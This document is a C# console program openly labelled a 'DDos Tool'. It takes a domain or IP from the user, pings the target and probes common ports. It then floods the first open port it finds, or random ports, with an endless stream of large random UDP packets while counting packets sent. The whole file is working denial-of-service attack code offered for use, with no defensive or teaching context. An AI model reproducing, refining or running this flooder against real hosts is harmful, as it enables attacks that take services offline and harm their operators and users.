using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;

class Program
{
    private static readonly Random Random = new Random();

    static void Main()
    {
        Console.Title = "DDDos Tool (Dewzas DDos Tool)";
        Console.Clear();
        DrawBanner();
        while (true)
        {
            string? opt = Console.ReadLine();
            string ip = "";

            switch (opt)
            {
                case "1":
                    Console.Write("[+] Domain: ");
                    string? domain = Console.ReadLine();
                    try
                    {
                        ip = Dns.GetHostAddresses(domain)[0].ToString();
                    }
                    catch
                    {
                        Console.WriteLine("[i] Could not resolve domain. Please try again.");
                        continue;
                    }
                    break;

                case "2":
                    Console.Write("[+] IP Address: ");
                    ip = Console.ReadLine();
                    break;

                case "3":
                    Environment.Exit(0);
                    break;

                default:
                    Console.WriteLine("[i] Invalid Choice!");
                    Console.WriteLine("[+] Press any key to Retry");
                    Console.ReadKey();
                    Console.Clear();
                    DrawBanner();
                    continue;
            }

            if (!string.IsNullOrEmpty(ip))
            {
                Console.WriteLine("[i] Checking if IP is reachable...");
                if (IsIpReachable(ip))
                {
                    Console.WriteLine("[i] IP is reachable. Searching for open ports...");
                    int openPort = FindOpenPort(ip);
                    if (openPort > 0)
                    {
                        Console.WriteLine($"[i] Open port found: {openPort}");
                        StartAttack(ip, openPort);
                    }
                    else
                    {
                        Console.WriteLine("[i] No open ports found on the target IP.");
                        Console.WriteLine("Use random ports? [y/n]");
                        string choice = Console.ReadLine()?.ToLower();
                        if (choice == "y")
                        {
                            Console.Clear();
                            Console.WriteLine("[i] Random ports will be used.");
                            StartAttack(ip, useRandomPorts: true);
                        }
                        else if (choice == "n")
                        {
                            Environment.Exit(0);
                        }
                    }
                }
                else
                {
                    Console.WriteLine("[i] The target IP is not reachable.");
                }
            }
        }
    }

    private static bool IsIpReachable(string ip)
    {
        try
        {
            using (Ping ping = new Ping())
            {
                PingReply reply = ping.Send(ip, 1000);
                return reply.Status == IPStatus.Success;
            }
        }
        catch
        {
            return false;
        }
    }

    private static int FindOpenPort(string ip)
    {
        int[] commonPorts = { 80, 443, 22, 21, 8080, 3306, 25, 53, 3000, 5000};

        foreach (int port in commonPorts)
        {
            Console.WriteLine($"[i] Checking port {port}...");
            using (var client = new TcpClient())
            {
                try
                {
                    var task = client.ConnectAsync(ip, port);
                    if (task.Wait(500))
                    {
                        if (client.Connected)
                        {
                            return port;
                        }
                    }
                }
                catch
                {
                    
                }
            }
        }

        return -1;
    }

    private static void StartAttack(string ip, int port = 0, bool useRandomPorts = false)
    {
        Console.Clear();
        Console.WriteLine("[i] Initializing...");
        Thread.Sleep(500);
        Console.WriteLine("[i] Starting...");
        Thread.Sleep(1500);

        byte[] buffer = new byte[9999]; // OG bytes [1490]
        Random.NextBytes(buffer);
        using (var udpClient = new UdpClient())
        {
            try
            {
                int sent = 0;
                while (true)
                {
                    if (useRandomPorts)
                    {
                        port = Random.Next(1, 65535);
                    }

                    udpClient.Send(buffer, buffer.Length, ip, port);
                    sent++;

                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($"[SUCCESS] Sent {sent} packets to {ip} through port:{port}");
                }
            }
            catch (Exception ex)
            {
                Console.Clear();
                Console.WriteLine($"[ERR] ERROR while sending: {ex.Message}");
                Console.ReadKey();
                Environment.Exit(0);
            }
        }
    }

    public static async void DrawBanner()
    {
        await AnimText("DDos Tool\nPlease enter one of the following numbers and then hit ENTER\n", false, 20, 0);
        await AnimText("\n1. Website Domain\n2. IP Address\n3. Exit", false, 20, 0);
        Console.Write("\n\n>");
    }

    private static async Task AnimText(string text, bool clearAfter, int delay = 30, int waitDelay = 2000)
    {
        foreach (char c in text)
        {
            Console.Write(c);
            await Task.Delay(delay);
        }

        var cancellationTokenSource = new CancellationTokenSource();

        await Task.Delay(waitDelay);
        cancellationTokenSource.Cancel();

        if (clearAfter)
        {
            for (int i = text.Length; i >= 0; i--)
            {
                Console.SetCursorPosition(i, Console.CursorTop);
                Console.Write(' ');
                await Task.Delay(delay);
            }
        }
    }
}